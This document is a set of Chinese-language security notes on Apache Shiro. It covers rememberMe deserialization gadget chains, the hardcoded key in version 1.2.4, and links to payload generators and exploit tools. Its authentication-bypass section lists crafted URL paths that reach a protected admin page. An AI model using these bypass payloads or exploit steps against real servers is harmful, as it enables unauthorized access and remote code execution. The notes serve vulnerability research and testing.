## Shiro反序列化
- [Java版payload生成](https://github.com/shadowsock5/Poc/blob/master/Shiro/ShiroDeser.java)
- [Python版payload生成](https://github.com/shadowsock5/Poc/blob/master/Shiro/shiro_deser.py)

### 反序列化利用链
从Shiro-core官方的pom.xml文件中可以看出，在项目通过pom.xml引入shiro-core时，会自动引入commons-beanutils。当shiro-core的版本改变时，CB的版本也会随之改变。通过测试发现，shiro从1.2.4到1.3.2依赖的都是CB-1.8.3。而在shiro-1.3.2的下一个版本1.4.0中依赖的CB是1.9.3，从这个shiro版本开始，引入shiro依赖的项目会依赖CC3.2.2。
参考：
- https://github.com/apache/commons-beanutils/blob/BEANUTILS_1_9_1/pom.xml#L278
- https://github.com/apache/shiro/blob/shiro-root-1.4.0/pom.xml#L832
- https://github.com/apache/shiro/blob/shiro-root-1.3.2/pom.xml
- https://github.com/apache/shiro/blob/shiro-root-1.2.4/pom.xml#L617

### 说明
- 1.2.4的key硬编码在`org\apache\shiro\mgt\AbstractRememberMeManager.java`这个文件里；
- 1.2.4以上（1.2.5开始）的key在AbstractRememberMeManager构造方法里是这样写的：
```java
this.setCipherKey(cipherService.generateNewKey().getEncoded());
```
可以直接调这个接口，这样得到的key就是随机的。当然开发者也可以通过配置文件配置，比如`shiro.ini`, `xxx-shiro-xml`等制定一个自己实现的RememberMeManager（继承自`CookieRememberMeManager`），然后`applications.properties`里面配置这个硬编码的seed。如果攻击者知道了这个seed，可以方便地拿到shiro的key。
- 1.4.2以后，从`CBC`模式变成了`GCM`模式，需要相应地修改一下代码。

## Shiro权限绕过
比如想要访问的敏感url为：
```
/admin/index
```
假设`/static` 路径不需要认证即可访问。

绕过姿势：
- /admin/index%2f
- /;/admin/index
- /static;/admin/index
- /static;/../admin/index
- /static/..;/admin/index
- /admin/index%25%32%46index
- /admin/%3bindex


## 参考
- https://www.cnblogs.com/loong-hon/p/10619616.html
- https://www.codenong.com/cs106643678/
- [Shiro权限验证绕过史](https://s31k31.github.io/2020/08/20/Shiro_Authentication_Bypass/)
- [Shiro反序列化漏洞笔记二（检测篇）](http://xiashang.xyz/2020/09/05/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%BA%8C%EF%BC%88%E6%A3%80%E6%B5%8B%E7%AF%87%EF%BC%89/)
- [深入利用Shiro反序列化漏洞](https://xz.aliyun.com/t/8445)
- https://github.com/apache/shiro/blob/8751ce1c31848efa96242099ba908bd110540246/RELEASE-NOTES#L163
- https://github.com/apache/shiro/blob/323698ed6e22e417a5e86e367906cddb29932bbe/crypto/cipher/src/main/java/org/apache/shiro/crypto/cipher/AesCipherService.java
- https://jkme.github.io/cve-2016-6802-exp.html

## Shiro反序列化利用工具
- https://github.com/Ares-X/shiro-exploit
- https://github.com/feihong-cs/ShiroExploit-Deprecated
- https://github.com/wyzxxz/shiro_rce
- https://github.com/pmiaowu/BurpShiroPassiveScan
- https://github.com/potats0/shiroPoc
- https://github.com/fupinglee/ShiroScan
